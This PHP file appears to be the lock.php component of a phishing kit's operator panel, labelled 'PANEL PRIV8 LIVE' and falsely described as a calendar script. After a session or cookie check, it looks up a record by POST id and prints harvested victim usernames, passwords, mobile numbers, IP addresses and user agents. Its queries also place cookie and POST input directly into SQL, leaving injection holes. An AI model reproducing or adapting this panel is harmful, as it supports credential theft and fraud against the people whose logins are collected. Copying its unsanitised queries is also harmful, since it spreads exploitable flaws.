<?php
/**
* PANEL PRIV8 LIVE
* @package    lock.php
* @author     https://t.me/neo_net
* @copyright  2021
* @version    2.0
* Info :  PHP Calendar Block Days
*/
session_start();
include '../database/db.php';
include '../defense/ajax.php';
$hash = @$_COOKIE['identificator'];
$fhrji = $connection->query("SELECT hash FROM secure where hash='$hash'");
if (!isset($_SESSION['userSession']) && mysqli_num_rows($fhrji) === 0) {
//Nothing to do boy
}
else {
$id = $_POST['id'];
$notification = $connection->query("SELECT * FROM numeros where id='".$id."'");
if(mysqli_num_rows($notification) === 0){
echo '<pre>Sin datos</pre>';
}
while($row = mysqli_fetch_array($notification)){

?>
<pre>
<?php

if ($row['stella'] == '') {$row['stella']='NO';}

if ($row['stella'] == 1) {$row['stella']='SI';}

if ($row['firma'] == '') {$row['firma']='Sin Firma';}
$message = "<pre>Full Logo Info\n";
$message .= "User          : ".$row['user']."\n";
$message .= "Pass        : ".$row['pass']."\n";
$message .= "Movil        : ".$row['movil']."\n";

$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "Client IP: ".$row['ip']."\n";
$message .= "User Agent : ".$row['user_agent']."\n";
$message .= "</pre>";

echo $message;
?>

</pre>

<?php

}


}